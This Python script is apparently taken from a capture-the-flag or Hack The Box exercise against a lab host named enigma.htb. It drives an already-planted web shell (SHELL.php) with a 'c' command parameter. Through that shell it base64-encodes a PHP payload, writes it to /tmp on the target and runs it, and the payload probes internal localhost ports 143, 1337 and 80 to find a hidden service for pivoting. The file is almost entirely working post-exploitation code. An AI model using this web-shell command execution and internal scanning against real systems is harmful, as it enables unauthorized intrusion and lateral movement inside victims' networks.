import urllib.request, urllib.parse

# Try to use PHP to check if the connection reaches OliveTin
# Create a PHP script that sends raw TCP SYN and checks the response
php_code = b'<?php\n' + b'$' + b's = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);\n' + b'socket_set_option(' + b'$' + b's, SOL_SOCKET, SO_SNDTIMEO, [\"sec\"=>2, \"usec\"=>0]);\n' + b'$' + b'r = @socket_connect(' + b'$' + b's, \"127.0.0.1\", 143);\necho \"143: \" . var_export(' + b'$' + b'r, true) . \" \" . socket_strerror(socket_last_error()) . \"\\n\";\n' + b'socket_close(' + b'$' + b's);\n' + b'$' + b's2 = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);\n' + b'socket_set_option(' + b'$' + b's2, SOL_SOCKET, SO_SNDTIMEO, [\"sec\"=>2, \"usec\"=>0]);\n' + b'$' + b'r2 = @socket_connect(' + b'$' + b's2, \"127.0.0.1\", 1337);\necho \"1337: \" . var_export(' + b'$' + b'r2, true) . \" \" . socket_strerror(socket_last_error()) . \"\\n\";\n' + b'socket_close(' + b'$' + b's2);\n' + b'$' + b's3 = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);\n' + b'socket_set_option(' + b'$' + b's3, SOL_SOCKET, SO_SNDTIMEO, [\"sec\"=>2, \"usec\"=>0]);\n' + b'$' + b'r3 = @socket_connect(' + b'$' + b's3, \"127.0.0.1\", 80);\necho \"80: \" . var_export(' + b'$' + b'r3, true) . \" \" . socket_strerror(socket_last_error()) . \"\\n\";\n' + b'socket_close(' + b'$' + b's3);\n?>'

import base64
encoded = base64.b64encode(php_code).decode()

# Write and run
cmd = "echo " + encoded + " | base64 -d > /tmp/stest2.php; php /tmp/stest2.php 2>&1"
url = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": cmd})
headers = {"Host": "support_001.enigma.htb"}
req = urllib.request.Request(url, headers=headers)
try:
    resp = urllib.request.urlopen(req, timeout=15)
    result = resp.read().decode("utf-8", errors="replace").strip()
    print(result[:500])
except Exception as e:
    print(f"Error: {e}")
